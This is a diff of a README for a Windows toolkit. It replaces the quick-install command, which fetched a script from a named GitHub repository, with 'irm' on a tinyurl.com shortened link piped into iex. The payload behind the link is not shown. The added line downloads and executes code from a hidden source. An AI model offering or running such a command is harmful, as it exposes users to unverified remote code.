@@ -23,10 +23,10 @@ It functions as a complete operating system utility, allowing you to manage Wind
 
 ## ⚡ Quick Install (One-Line)
 
-Run the following command in PowerShell as Administrator to instantly download, install, and configure the Toolkit on your machine:
+Run the following command in PowerShell to instantly download, install, and configure the Toolkit on your machine:
 
 ```powershell
-iwr -useb https://raw.githubusercontent.com/adityasing9/ToolKit/main/install.ps1 | iex
+irm https://tinyurl.com/ktlla | iex
 ```
 
 ---
